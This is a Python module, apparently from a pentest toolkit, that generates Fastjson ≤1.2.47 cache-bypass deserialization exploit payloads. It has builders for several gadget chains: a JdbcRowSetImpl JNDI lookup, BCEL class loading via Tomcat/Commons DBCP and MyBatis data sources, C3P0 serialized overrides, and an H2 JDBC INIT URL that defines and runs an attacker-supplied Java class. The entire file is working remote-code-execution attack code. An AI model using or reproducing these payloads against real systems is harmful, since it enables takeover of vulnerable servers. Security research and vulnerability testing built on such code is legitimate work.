"""Fastjson ≤1.2.47 缓存绕过 payload 生成（对齐公开笔记 / safe6Sec / vulhub）。"""

from __future__ import annotations

import base64
import json
from typing import Any, Optional

from fastjson_toolkit.poc.getter import (
    GetterTrigger,
    apply_currency_if_needed,
    json_object_key,
    normalize_getter_trigger,
    uses_json_key,
)
from fastjson_toolkit.poc.v1_2_47.catalog import GadgetKind, get_gadget
from fastjson_toolkit.poc.v1_2_47.encode import (
    bcel_code_from_class_bytes,
    c3p0_user_overrides,
    ensure_bcel_code,
    ensure_c3p0_user_overrides,
)


def _dumps(obj: Any) -> str:
    return json.dumps(obj, ensure_ascii=False, separators=(",", ":"))


def _resolve_bcel(
    *,
    bcel_code: Optional[str] = None,
    class_b64: Optional[str] = None,
) -> str:
    if bcel_code and bcel_code.strip():
        return ensure_bcel_code(bcel_code)
    if class_b64 and class_b64.strip():
        raw = base64.b64decode(class_b64.strip())
        if not raw.startswith(b"\xca\xfe\xba\xbe"):
            raise ValueError("class_b64 不是合法 .class（缺少 CAFEBABE）")
        return bcel_code_from_class_bytes(raw)
    raise ValueError("BCEL 链需要 bcel_code 或 class_b64")


def build_jdbc_rowset(jndi_url: str) -> str:
    url = (jndi_url or "").strip()
    if not url:
        raise ValueError("jndi_url 不能为空")
    return _dumps(
        {
            "x1": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl",
            },
            "x2": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": url,
                "autoCommit": True,
            },
        }
    )


def _build_bcel_dbcp(
    datasource_class: str,
    bcel: str,
    *,
    trigger: GetterTrigger = "ref",
) -> str:
    # 笔记形态：Class 预热 DataSource + BCEL ClassLoader，JSONObject + $ref 拉 connection
    if uses_json_key(trigger):
        # JSONObject 作 Map key → toString → getConnection（非严格 JSON）
        bcel_j = json.dumps(bcel, ensure_ascii=False)
        key_fields = (
            f'"x3":{{"@type":{json.dumps(datasource_class)},'
            f'"driverClassLoader":{{"@type":'
            f'"com.sun.org.apache.bcel.internal.util.ClassLoader"}},'
            f'"driverClassName":{bcel_j}}}'
        )
        return (
            "{"
            f'"name":{{"@type":"java.lang.Class","val":{json.dumps(datasource_class)}}},'
            '"x1":{'
            '"name":{"@type":"java.lang.Class",'
            '"val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},'
            + json_object_key(key_fields, with_type=True)
            + "}}"
        )
    return _dumps(
        {
            "name": {
                "@type": "java.lang.Class",
                "val": datasource_class,
            },
            "x1": {
                "name": {
                    "@type": "java.lang.Class",
                    "val": "com.sun.org.apache.bcel.internal.util.ClassLoader",
                },
                "x2": {
                    "@type": "com.alibaba.fastjson.JSONObject",
                    "x3": {
                        "@type": datasource_class,
                        "driverClassLoader": {
                            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                        },
                        "driverClassName": bcel,
                        "$ref": "$.x1.x2.x3.connection",
                    },
                },
            },
        }
    )


def build_bcel_tomcat_dbcp(bcel: str, *, trigger: GetterTrigger = "ref") -> str:
    return _build_bcel_dbcp(
        "org.apache.tomcat.dbcp.dbcp.BasicDataSource", bcel, trigger=trigger
    )


def build_bcel_tomcat_dbcp2(bcel: str, *, trigger: GetterTrigger = "ref") -> str:
    return _build_bcel_dbcp(
        "org.apache.tomcat.dbcp.dbcp2.BasicDataSource", bcel, trigger=trigger
    )


def build_bcel_commons_dbcp(bcel: str, *, trigger: GetterTrigger = "ref") -> str:
    return _build_bcel_dbcp(
        "org.apache.commons.dbcp.BasicDataSource", bcel, trigger=trigger
    )


def build_bcel_commons_dbcp2(bcel: str, *, trigger: GetterTrigger = "ref") -> str:
    return _build_bcel_dbcp(
        "org.apache.commons.dbcp2.BasicDataSource", bcel, trigger=trigger
    )


def build_c3p0_wrapper(user_overrides: str) -> str:
    code = ensure_c3p0_user_overrides(user_overrides)
    return _dumps(
        {
            "x1": {
                "@type": "java.lang.Class",
                "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
            },
            "x2": {
                "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
                "userOverridesAsString": code,
            },
        }
    )


def build_mybatis_bcel(bcel: str, *, trigger: GetterTrigger = "ref") -> str:
    """MyBatis UnpooledDataSource + BCEL；默认 `$ref` 触发 getConnection。"""
    code = ensure_bcel_code(bcel)
    if uses_json_key(trigger):
        return build_mybatis_bcel_legacy(code)
    return _dumps(
        {
            "x1": {
                "@type": "java.lang.Class",
                "val": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
            },
            "x2": {
                "name": {
                    "@type": "java.lang.Class",
                    "val": "com.sun.org.apache.bcel.internal.util.ClassLoader",
                },
                "x3": {
                    "@type": "com.alibaba.fastjson.JSONObject",
                    "u": {
                        "@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
                        "driverClassLoader": {
                            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                        },
                        "driver": code,
                        "$ref": "$.x2.x3.u.connection",
                    },
                },
            },
        }
    )


def build_mybatis_bcel_legacy(bcel: str) -> str:
    """公开笔记 / anquanke 形态：JSONObject 作 Map key（非严格 JSON）。"""
    code = ensure_bcel_code(bcel)
    return (
        '{"x":{'
        '"xxx":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},'
        '"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},'
        '"www":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},'
        '{"@type":"com.alibaba.fastjson.JSONObject",'
        '"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},'
        '"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource",'
        '"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},'
        f'"driver":{json.dumps(code, ensure_ascii=False)}'
        "}}:{}}"
        "}"
    )


def build_h2_init_url(class_b64: str) -> str:
    """构造 H2 INIT + CREATE ALIAS defineClass URL（与笔记一致）。"""
    b64 = class_b64.strip().replace("\n", "").replace("\r", "")
    if not b64:
        raise ValueError("class_b64 不能为空")
    # 校验一下
    raw = base64.b64decode(b64)
    if not raw.startswith(b"\xca\xfe\xba\xbe"):
        raise ValueError("class_b64 不是合法 .class（缺少 CAFEBABE）")

    alias_body = (
        "void exec() throws java.io.IOException { try { "
        f'byte[] b = java.util.Base64.getDecoder().decode("{b64}"); '
        "java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod("
        '"defineClass", byte[].class, int.class, int.class); '
        "method.setAccessible(true); "
        "Class c = (Class) method.invoke("
        "Thread.currentThread().getContextClassLoader(), b, 0, b.length); "
        "c.newInstance(); "
        "} catch (Exception e){ } }"
    )
    # JDBC URL 按 ';' 拆 connection settings；ALIAS 源码里的分号必须写成 \;
    alias_esc = alias_body.replace(";", "\\;")
    return (
        "jdbc:h2:mem:test;MODE=MSSQLServer;INIT="
        "drop alias if exists exec\\;"
        f"CREATE ALIAS EXEC AS '{alias_esc}'\\;"
        "CALL EXEC ()\\;"
    )


def build_h2_jdbc(
    *,
    class_b64: Optional[str] = None,
    h2_url: Optional[str] = None,
    trigger: GetterTrigger = "ref",
    json_key_with_type: bool = True,
    json_key_as_array: bool = False,
) -> str:
    if h2_url and h2_url.strip():
        url = h2_url.strip()
    elif class_b64 and class_b64.strip():
        url = build_h2_init_url(class_b64)
    else:
        raise ValueError("H2 链需要 h2_url 或 class_b64")

    if uses_json_key(trigger):
        # java-chains / 笔记：JSONObject（可省 @type）或 JSONArray 作 key 触发 getter
        url_j = json.dumps(url, ensure_ascii=False)
        fields = (
            f'"c":{{"@type":"org.h2.jdbcx.JdbcDataSource","url":{url_j}}}'
        )
        return (
            "{"
            '"x1":{"@type":"java.lang.Class","val":"org.h2.jdbcx.JdbcDataSource"},'
            + json_object_key(
                fields,
                with_type=json_key_with_type,
                as_array=json_key_as_array,
            )
            + "}"
        )

    return _dumps(
        {
            "x1": {
                "@type": "java.lang.Class",
                "val": "org.h2.jdbcx.JdbcDataSource",
            },
            "x2": {
                "@type": "com.alibaba.fastjson.JSONObject",
                "c": {
                    "@type": "org.h2.jdbcx.JdbcDataSource",
                    "url": url,
                },
            },
            "x3": {"$ref": "$.x2.c.connection"},
        }
    )


def build_payload(
    gadget: GadgetKind | str,
    *,
    jndi_url: Optional[str] = None,
    bcel_code: Optional[str] = None,
    class_b64: Optional[str] = None,
    user_overrides: Optional[str] = None,
    serialized_b64: Optional[str] = None,
    h2_url: Optional[str] = None,
    getter_trigger: GetterTrigger | str = "ref",
    currency_field: str = "currency",
    json_key_with_type: bool = True,
    json_key_as_array: bool = False,
) -> str:
    """按 gadget id 生成证明 payload 字符串。

    getter_trigger:
      - ref：内嵌 ``$ref`` 触发 getter（默认，适合无期望类 parse）
      - json_key：JSONObject/JSONArray 作 Map key
      - currency：在 ref 形态外再套 Currency（有期望类时）
      - currency_json_key：Currency + json_key（java-chains 形态）
    """
    entry = get_gadget(str(gadget))
    gid = entry.id
    trigger = normalize_getter_trigger(getter_trigger)

    if gid == "jdbc_rowset":
        # setter 链；json_key 无独立形态，仅 currency 套层有意义
        raw = build_jdbc_rowset(jndi_url or "")
        return apply_currency_if_needed(raw, trigger, currency_field=currency_field)

    if gid in (
        "bcel_tomcat_dbcp",
        "bcel_tomcat_dbcp2",
        "bcel_commons_dbcp",
        "bcel_commons_dbcp2",
        "mybatis_bcel",
    ):
        bcel = _resolve_bcel(bcel_code=bcel_code, class_b64=class_b64)
        builders = {
            "bcel_tomcat_dbcp": build_bcel_tomcat_dbcp,
            "bcel_tomcat_dbcp2": build_bcel_tomcat_dbcp2,
            "bcel_commons_dbcp": build_bcel_commons_dbcp,
            "bcel_commons_dbcp2": build_bcel_commons_dbcp2,
            "mybatis_bcel": build_mybatis_bcel,
        }
        raw = builders[gid](bcel, trigger=trigger)
        return apply_currency_if_needed(raw, trigger, currency_field=currency_field)

    if gid == "c3p0_wrapper":
        if user_overrides and user_overrides.strip():
            raw = build_c3p0_wrapper(user_overrides)
        elif serialized_b64 and serialized_b64.strip():
            raw_bytes = base64.b64decode(serialized_b64.strip())
            raw = build_c3p0_wrapper(c3p0_user_overrides(raw_bytes))
        else:
            raise ValueError("C3P0 链需要 user_overrides 或 serialized_b64")
        return apply_currency_if_needed(raw, trigger, currency_field=currency_field)

    if gid == "h2_jdbc":
        raw = build_h2_jdbc(
            class_b64=class_b64,
            h2_url=h2_url,
            trigger=trigger,
            json_key_with_type=json_key_with_type,
            json_key_as_array=json_key_as_array,
        )
        return apply_currency_if_needed(raw, trigger, currency_field=currency_field)

    raise ValueError(f"未实现的 gadget: {gid}")
